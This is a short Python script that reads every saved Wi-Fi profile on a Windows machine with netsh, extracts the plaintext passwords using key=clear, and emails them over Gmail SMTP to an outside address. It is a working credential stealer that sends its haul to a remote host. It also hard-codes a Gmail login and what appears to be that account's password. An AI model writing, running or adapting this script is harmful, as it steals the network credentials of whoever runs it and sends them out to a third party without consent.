import re, subprocess, smtplib


command= "netsh wlan show profiles"
networks= subprocess.check_output(command, shell=True).decode('utf-8')
network_names_list= re.findall(r"(?:Profile\s*:\s)(.*)", networks)
result= ""



for network_name in network_names_list:
    filter_name = (f'"{network_name}"')
    command2 = "netsh wlan show profiles " + "name=" +  filter_name +   " key=clear"
    current_result= subprocess.check_output(command2, shell=True).decode('utf-8')
    result = result + current_result
print(result)



try: 
    #Create your SMTP session 
    smtp = smtplib.SMTP('smtp.gmail.com', 587) 
   #Use TLS to add security 
    smtp.starttls() 
    #User Authentication 
    smtp.login("bhavyajain.1224@gmail.com", "Bitcoin150000$$PAYMENTS")
    #Defining The Message 
    message = result 
    #Sending the Email
    smtp.sendmail("bhavyajain.1224@gmail.com", "bhavyajain.bj321@gmail.com",message) 
    #Terminating the session 
    smtp.quit() 
    print ("Email sent successfully!") 
except Exception as ex: 
    print("Something went wrong....",ex)


